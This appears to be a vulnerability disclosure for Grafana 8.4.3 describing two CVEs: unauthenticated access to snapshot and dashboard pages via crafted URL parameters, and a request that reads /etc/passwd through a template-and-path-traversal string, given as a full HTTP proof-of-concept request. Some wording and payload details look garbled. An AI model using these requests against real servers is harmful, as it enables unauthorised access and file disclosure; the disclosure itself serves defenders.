# grafana
grafana 8.4.3 (b7d2911ca)

# First point - CVE-2022-32276

## Unauthenticated and authenticated users can send a false request for snapshot query using random key parameters, having access to the system dashboard area by going through the login page.
•	Rated version: 8.4.3 (b7d2911ca)
•	
Access the system the user is directed to the system home page, as image 1
![image](https://user-images.githubusercontent.com/28454566/171639021-9b0da9c7-837d-4f86-be73-a123eae5de9b.png)

Image 1: login form 


It has been verified that an unauthenticated user knowing the vulnerable directories can enter random ID value which allows unauthenticated access to the hospitalized system pages.
Parameter used:
/dashboard/snapshot/*?orgId=0
/invite/:
![image](https://user-images.githubusercontent.com/28454566/171639130-8e408037-3e65-4b15-a679-88e2f1987aea.png)

Image 2: Unauthenticated access to snapshot list

![image](https://user-images.githubusercontent.com/28454566/171639178-52a2f5d5-f57c-49b9-9258-2f60a3b6403a.png)

Image 3: Unauthenticated access to the dashboard menu


![image](https://user-images.githubusercontent.com/28454566/171639388-3b17937c-e1f5-448f-b5cb-f26722af95f9.png)

Image 4: Unauthenticated access to the filter menu


# Second point - CVE-2022-32275

##
•	Rated version: 8.4.3 (b7d2911ca)
•	Injection of parameters in http request.
## It has been verified that by injecting the following request into the login form the system returns internal page.

![image](https://user-images.githubusercontent.com/28454566/171640044-cf2029dc-8598-44f9-87ed-c6c09a152212.png)

Image 5: login form 



Viewing the request in burpsuite
![image](https://user-images.githubusercontent.com/28454566/171640173-5795e0b0-0f31-4cac-8ae5-5d413b0637d1.png)

Image 6: Intercepting the request by burpsuite


Change the request by adding /{{constructor.constructor'/.. /.. /.. /.. /.. /.. /.. /.. /etc/passwd?orgId=1 , encode : /dashboard/snapshot/%7B%7Bconstructor.constructor'/.. /.. /.. /.. /.. /.. /.. /.. /etc/passwd?orgId=1 HTTP/1.1



![image](https://user-images.githubusercontent.com/28454566/171640263-15364ef7-8741-40e2-98dd-dee80b44b28d.png)

Image 7: Request changed before submission to server


![image](https://user-images.githubusercontent.com/28454566/171640314-914a29f3-2f98-4ff2-9dc7-eaf7896e1d56.png)


Image 8: Data returned from the tampered request



### POC 2
Send the request to the Burpsuite Repeater  function and change the request header to:

```
GET /dashboard/snapshot/%7B%7Bconstructor.constructor'/.. /.. /.. /.. /.. /.. /.. /.. /etc/passwd?orgId=1 HTTP/1.1
Host: <grafana_host>:3000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-BR,en;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close-up
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache
```



![image](https://user-images.githubusercontent.com/28454566/171640452-7d292f9f-c35e-4067-b199-2ae9dea9ecbd.png)

Image 9: Changing the request in the repeater function.


![image](https://user-images.githubusercontent.com/28454566/171640507-360ce5d1-4486-4f29-adc4-a047e5655bfc.png)


Image 10: Unauthenticated access 



## References:
<li>https://cwe.mitre.org/data/definitions/1345.html</li>
<li>https://cwe.mitre.org/data/definitions/284.html</li>
<li>https://cwe.mitre.org/data/definitions/552.html</li>
<li>https://cwe.mitre.org/data/definitions/548.html</li>
<li>https://cwe.mitre.org/data/definitions/706.html</li>
<li>https://owasp.org/www-pdf-archive/OWASP_SCP_v1.3_pt-BR.pdf</li>
</ol>


